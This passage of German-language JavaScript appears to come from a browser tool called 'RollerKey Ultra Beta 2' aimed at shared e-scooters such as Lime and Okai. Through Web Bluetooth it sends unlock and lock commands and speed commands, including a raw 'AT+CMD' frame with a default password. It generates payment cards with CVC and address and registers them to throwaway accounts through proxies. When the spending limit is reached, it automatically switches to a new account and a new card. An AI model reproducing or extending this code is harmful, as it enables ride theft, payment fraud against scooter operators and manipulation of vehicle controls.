    await sendeOkai("OKECP", [String(st)]);
    setz("cStufe", "Stufe " + st + " von 3");
    log("Fahrstufe " + st + " für " + kmh + " km/h gesendet.", "g");
  }else{
    await sende(rahmen(0x1664, [kmh]));
    await sende(new TextEncoder().encode(
      "AT+CMD," + (passwort() || "00000000") + "," + Math.floor(Date.now() / 1000) +
      ",3,{\"speed\":" + kmh + "}$"));
    log("Tempo " + kmh + " km/h gesendet.", "g");
  }
  setz("cWahl", "gewählt " + kmh + " km/h");
}

/* ══════════════ FAHRT ══════════════ */

function fahrtStart(){
  if(S.fahrt) return;
  S.fahrt = { start:Date.now(), verbraucht:0, gestoppt:false };
  S.fahrt.timer = setInterval(fahrtTick, 1000);
  setz("uFahrt", "läuft");
  if($("uZeit")) $("uZeit").classList.add("laeuft");
  log("Fahrtzähler läuft.", "g");
}

function fahrtTick(){
  if(!S.fahrt) return;
  const sek = Math.floor((Date.now() - S.fahrt.start) / 1000);
  setz("uZeit", String(Math.floor(sek / 60)).padStart(2, "0") + ":" +
    String(sek % 60).padStart(2, "0"));
  S.fahrt.verbraucht = Math.round(sek / 60 * PREIS_MIN * 100);
  const c = aktuelleKarte();
  if(c){ c.rest = Math.max(0, S.grenze - S.fahrt.verbraucht); setz("cLimit", money(c.rest)) }
  setz("uUsed", money(S.fahrt.verbraucht));

  if(S.fahrt.verbraucht >= S.grenze && !S.fahrt.gestoppt){
    S.fahrt.gestoppt = true;
    log("Grenze erreicht, sperre und wechsle.", "y");
    fahrtStoppen();
    sperren().catch(() => {});
    wechseln().catch(e => log("Wechsel: " + err(e), "e"));
  }
}

function fahrtStoppen(){
  if(!S.fahrt) return;
  clearInterval(S.fahrt.timer);
  const c = aktuelleKarte();
  if(c) c.rest = Math.max(0, S.grenze - S.fahrt.verbraucht);
  S.fahrt = null;
  setz("uFahrt", "steht");
  if($("uZeit")) $("uZeit").classList.remove("laeuft");
  speichere();
  malen();
}

async function wechseln(){
  stat("Grenze erreicht, neues Konto …", "warn");
  S.akte = null;
  kartenNeu();
  await kontoNeu();
  await pruefen();
  await hinterlegen();
  stat("Neues Konto und neue Karte bereit.", "ok");
  ampel("blau", "Bereit.");
}

/* ══════════════ ANZEIGE AUFBAU ══════════════ */

function malen(){
  const c = aktuelleKarte(), a = S.akte, v = V[S.brand] || V.lime;
  setz("uGer", (S.geraet && S.geraet.name) || "–");
  setz("uMarke", v.label + " · max " + v.max + " km/h");
  setz("uAkk", S.akku === null ? "–" : S.akku + " %");
  setz("uMail", a ? a.mail : "–");
  setz("uSitz", a ? "angemeldet" : "keine");
  setz("uPost", a ? "aktiv" : "–");
  setz("uGrenze", money(S.grenze));
  setz("uGrenze2", money(S.grenze));
  setz("uWert", money(S.grenze));
  setz("cZust", !c ? "–" : c.ok ? "hinterlegt" : ((c.pm || c.tok) ? "Kennung" : "nur lokal"));
  setz("cText", "Motor " + v.modell + ", Grenze " + v.max + " km/h.");
  setz("cWahl", "gewählt " + Math.round(S.tempo) + " km/h");
  setz("cStufe", "Stufe " + stufe(S.tempo) + " von 3");
  setz("cMarke", v.label);

  const rs = $("reiheStufe");
  if(rs) rs.style.display = v.proto === "okai" ? "flex" : "none";

  const sl = $("iTempo");
  if(sl){ sl.max = String(v.max); sl.value = String(Math.min(S.tempo, v.max)) }

  cardPaint(c);
  document.querySelectorAll("[data-b]").forEach(x =>
    x.classList.toggle("on", x.dataset.b === S.brand));
  document.querySelectorAll("[data-t]").forEach(x =>
    x.classList.toggle("on",
      x.dataset.t === String(S.tempo) || (x.dataset.t === "max" && S.tempo >= v.max)));
}

/* ══════════════ WEGE ══════════════ */

async function wegNurKarte(){
  try{
    ampel("gelb", "Nur Karte …");
    kartenNeu();
    if(await pruefen()) await hinterlegen();
    stat("Karte hinterlegt, Konto nicht nötig.", "ok");
    ampel("gruen", "Fertig.");
  }catch(e){ ampel("rot", "Karte: " + err(e)) }
}

async function wegNurBluetooth(){
  try{
    ampel("gelb", "Nur Bluetooth …");
    if(!S.schreib) await verbinden();
    await entsperren();
  }catch(e){ ampel("rot", "Bluetooth: " + err(e)) }
}

async function wegLenker(){
  const n = prompt("Nummer vom Lenker (8 Zeichen):", S.lenker || S.qr || "");
  if(!n) return;
  S.lenker = n.replace(/[^0-9A-Fa-f]/g, "").slice(0, 8);
  speichere();
  log("Lenkerkennung gesetzt: " + S.lenker, "g");
  await wegNurBluetooth();
}

async function automatik(){
  try{
    stat("Automatik läuft …", "warn");
    ampel("gelb", "Automatik …");
    if(!S.akte) await kontoNeu();
    if(!aktuelleKarte() || aktuelleKarte().ok) kartenNeu();
    if(!await pruefen()) throw new Error("Karte abgelehnt");
    await hinterlegen();
    if(S.schreib) await entsperren();
    else log("Ohne Bluetooth: Konto und Karte sind fertig.", "y");
    ampel("gruen", "Fertig.");
  }catch(e){ ampel("rot", "Automatik: " + err(e)) }
}

/* ══════════════ NEBENWERK ══════════════ */

async function kopieren(){
  const c = aktuelleKarte();
  if(!c) return;
  const txt =
    "Typ: " + (c.typ || "") + "\nNummer: " + c.num + "\nAblauf: " + c.monat + "/" + c.jahr +
    "\nCVC: " + c.cvv + "\nInhaber: " + c.hal + "\nPLZ: " + c.plz +
    "\nStadt: " + c.ort + "\nLand: " + c.land;
  try{
    await navigator.clipboard.writeText(txt);
    karteStat("Alles in der Zwischenablage.");
  }catch(_){
    karteStat(txt.replace(/\n/g, " · "));
  }
}

let jsqrP = null;
function ladeJsQR(){
  if(window.jsQR) return Promise.resolve();
  if(jsqrP) return jsqrP;
  jsqrP = new Promise((res, rej) => {
    const s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js";
    s.onload = () => res();
    s.onerror = () => { jsqrP = null; rej(new Error("Scanner nicht ladbar")) };
    document.head.appendChild(s);
  });
  return jsqrP;
}

let camLauf = null;

function kameraAus(){
  if(camLauf){ clearInterval(camLauf); camLauf = null }
  const v = $("cam");
  if(v && v.srcObject){ v.srcObject.getTracks().forEach(t => t.stop()); v.srcObject = null }
  if(v) v.classList.remove("an");
}

function qrCode(text){
  let code = "";
  try{
    const u = new URL(text);
    const teile = u.pathname.split("/").filter(Boolean);
    code = (teile[teile.length - 1] || "").replace(/=+$/, "").toUpperCase();
  }catch(_){
    const m = String(text).match(/([A-Z0-9]{5,})/i);
    code = m ? m[1].toUpperCase() : "";
  }
  return code;
}

function qrUebernehmen(code){
  kameraAus();
  if(!code){ stat("Code unlesbar.", "err"); return }
  S.qr = code; S.lenker = code; speichere();
  log("QR: " + code, "g");
  stat("Code " + code + " · gespeichert.", "ok");
}

async function qr(){
  kameraAus();
  const v = $("cam");
  let det = null;
  try{
    const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
    v.srcObject = s; v.classList.add("an"); await v.play();
  }catch(e){ stat("Kamera: " + err(e), "err"); return }

  if("BarcodeDetector" in window){
    try{ det = new BarcodeDetector({ formats:["qr_code"] }) }catch(_){ det = null }
  }
  if(!det){
    try{ await ladeJsQR() }catch(e){ stat(err(e), "err"); kameraAus(); return }
  }
  stat("Code in den Rahmen halten.", "warn");

  camLauf = setInterval(async () => {
    if(!v.srcObject) return;
    try{
      if(det){
        const r = await det.detect(v);
        if(r.length){ qrUebernehmen(qrCode(r[0].rawValue)); return }
      }else if(window.jsQR && v.videoWidth){
        const c = document.createElement("canvas");
        c.width = v.videoWidth; c.height = v.videoHeight;
        const g = c.getContext("2d");
        g.drawImage(v, 0, 0);
        const d = g.getImageData(0, 0, c.width, c.height);
        const q = window.jsQR(d.data, c.width, c.height);
        if(q && q.data) qrUebernehmen(qrCode(q.data));
      }
    }catch(_){}
  }, 600);
}

function selbstpruefung(){
  const c = aktuelleKarte();
  const r = [];
  r.push("Web Bluetooth: " + (navigator.bluetooth ? "ja" : "NEIN"));
  r.push("Speicher: " + (typeof localStorage !== "undefined" ? "ja" : "NEIN"));
  r.push("Karte vorhanden: " + (c ? "ja" : "nein"));
  if(c){
    r.push("Prüfziffer: " + (luhnOk(c.num) ? "ok" : "FEHLER"));
    r.push("Länge: " + c.num.length + " (soll " + (c.typ === "AMEX" ? 15 : 16) + ")");
    r.push("CVC: " + c.cvv.length + " Stellen");
    r.push("Ablauf: " + c.monat + "/" + c.jahr);
    r.push("Adresse: " + (c.plz && c.ort && c.land ? "vollständig" : "UNVOLLSTÄNDIG"));
  }
  r.push("Wert: " + money(S.grenze));
  r.push("Tempo: " + S.tempo + " von max " + V[S.brand].max +
    " (Stufe " + stufe(S.tempo) + ", " + V[S.brand].proto + ")");
  r.push("Gesperrte Domains: " + (S.block.length ? S.block.join(", ") : "keine"));
  log("── Selbstprüfung ──", "y");
  r.forEach(x => log(x, /FEHLER|NEIN|UNVOLL/.test(x) ? "e" : "g"));
  stat("Selbstprüfung fertig, siehe Protokoll.", "ok");
}

async function netztest(){
  log("── Netztest ──", "y");
  const ziele = [{ n:"worker", f:WORKER + encodeURIComponent("https://example.com") }]
    .concat(PROXIES.map((p, i) => ({ n:"p" + i, f:p("https://example.com") })));
  for(const w of ziele){
    const ab = new AbortController();
    const t = setTimeout(() => ab.abort(), 9000);
    try{
      const r = await fetch(w.f, { cache:"no-store", signal:ab.signal });
      clearTimeout(t);
      log(w.n + ": HTTP " + r.status, r.ok ? "g" : "y");
    }catch(e){ clearTimeout(t); log(w.n + ": " + err(e), "e") }
  }
  stat("Netztest fertig.", "ok");
}

function diag(){
  const c = aktuelleKarte();
  log("── Diagnose ──", "y");
  log("Marke " + S.brand + ", Protokoll " + V[S.brand].proto + ", max " + V[S.brand].max);
  log("Tempo " + S.tempo + ", Stufe " + stufe(S.tempo));
  log("Bluetooth " + (navigator.bluetooth ? "vorhanden" : "fehlt"));
  log("Kanal " + (S.schreib ? "offen" : "zu"));
  log("Schlüssel " + (S.pks[S.brand] ? "vorhanden" : "keiner"));
  log("Karten " + S.karten.length + ", Konto " + (S.akte ? "ja" : "nein"));
  log("Wert " + money(S.grenze) + ", QR " + (S.qr || "keiner"));
  if(c) log("Karte " + c.typ + " …" + c.num.slice(-4) + ", luhn " + (luhnOk(c.num) ? "ok" : "FEHLER"));
  stat("Diagnose im Protokoll.", "ok");
}

/* ══════════════ VERDRAHTUNG ══════════════ */

function fang(fn){
  return async (...a) => {
    if(S.laeuft) return;
    S.laeuft = true;
    try{ await fn(...a) }
    catch(e){ ampel("rot", err(e)) }
    finally{ S.laeuft = false }
  };
}

function verdrahten(){
  document.querySelectorAll("[data-b]").forEach(x => x.addEventListener("click", () => {
    S.brand = x.dataset.b;
    S.tempo = Math.min(S.tempo, V[S.brand].max);
    speichere(); malen();
  }));

  document.querySelectorAll("[data-g]").forEach(x => x.addEventListener("click", () => {
    wertSetzen(+x.dataset.g);
  }));

  document.querySelectorAll("[data-t]").forEach(x => x.addEventListener("click", async () => {
    S.tempo = x.dataset.t === "max" ? V[S.brand].max : +x.dataset.t;
    speichere(); malen();
    if(S.schreib) await tempoSenden().catch(e => log(err(e), "e"));
  }));

  const sl = $("iTempo");
  if(sl){
    sl.addEventListener("input", () => { S.tempo = +sl.value; speichere(); malen() });
    sl.addEventListener("change", async () => {
      if(S.schreib) await tempoSenden().catch(e => log(err(e), "e"));
    });
  }

  const wf = $("iWert");
  const wertAusFeld = () => {
    const e = Math.round(parseFloat(String(wf.value).replace(",", ".")) * 100);
    if(!wertSetzen(e)) wf.value = String(Math.round(S.grenze / 100));
  };
  if(wf){
    wf.addEventListener("change", wertAusFeld);
    const wb = $("bWert");
    if(wb) wb.addEventListener("click", wertAusFeld);
  }

  $("bConn").addEventListener("click", fang(verbinden));
  $("bTren").addEventListener("click", fang(async () => {
    if(S.geraet && S.geraet.gatt.connected) S.geraet.gatt.disconnect();
    S.schreib = null; S.melde = null; S.geraet = null; malen(); ampel("rot", "Getrennt.");
  }));
  $("bUnlock").addEventListener("click", fang(entsperren));
  $("bLock").addEventListener("click", fang(sperren));
  $("bBeep").addEventListener("click", fang(piepsen));
  $("bLicht").addEventListener("click", fang(licht));
  $("bScan").addEventListener("click", fang(qr));
  $("bWeg4").addEventListener("click", fang(wegLenker));
  $("bWeg4b").addEventListener("click", fang(wegLenker));

  $("bCock").addEventListener("click", () => {
    $("cockpit").classList.add("an");
    document.body.classList.add("cockpitAn");
    $("cockpit").scrollTop = 0;
    malen();
  });
  $("bZurueck").addEventListener("click", () => {
    $("cockpit").classList.remove("an");
    document.body.classList.remove("cockpitAn");
    window.scrollTo(0, 0);
  });

  $("bStart").addEventListener("click", () => fahrtStart());
  $("bStop").addEventListener("click", () => fahrtStoppen());

  $("bNeuKarte").addEventListener("click", () => kartenNeu());
  $("bPruefKarte").addEventListener("click", fang(pruefen));
  $("bKopieren").addEventListener("click", fang(kopieren));

  $("bAuto").addEventListener("click", fang(automatik));
  $("bWeg1").addEventListener("click", fang(automatik));
  $("bWeg2").addEventListener("click", fang(wegNurKarte));
  $("bWeg2b").addEventListener("click", fang(wegNurKarte));
  $("bWeg3").addEventListener("click", fang(wegNurBluetooth));
  $("bWeg3b").addEventListener("click", fang(wegNurBluetooth));
  $("bHinterlegen").addEventListener("click", fang(async () => {
    await hinterlegen(); stat("Karte hinterlegt.", "ok");
  }));
  $("bNeu").addEventListener("click", fang(async () => {
    S.akte = null; speichere(); await kontoNeu(); stat("Konto neu.", "ok");
  }));

  $("bPruef").addEventListener("click", () => selbstpruefung());
  $("bNetz").addEventListener("click", fang(netztest));
  $("bDiag").addEventListener("click", () => diag());
  $("bLeer").addEventListener("click", () => { $("log").innerHTML = "" });

  window.addEventListener("error", e => log("Fehler: " + err(e.message), "e"));
  window.addEventListener("unhandledrejection", e => log("Promise: " + err(e.reason), "e"));
}

/* ══════════════ START ══════════════ */

function start(){
  lade();
  verdrahten();
  if(!S.karten.length) S.karten.push(neueKarte());
  const wf = $("iWert");
  if(wf) wf.value = String(Math.round(S.grenze / 100));
  malen();
  stat("Bereit. Erst verbinden, dann entsperren.", "");
  log("RollerKey Ultra Beta 2 gestartet.", "g");
  if("serviceWorker" in navigator){
    navigator.serviceWorker.register("sw.js").catch(() => {});
  }
}

start();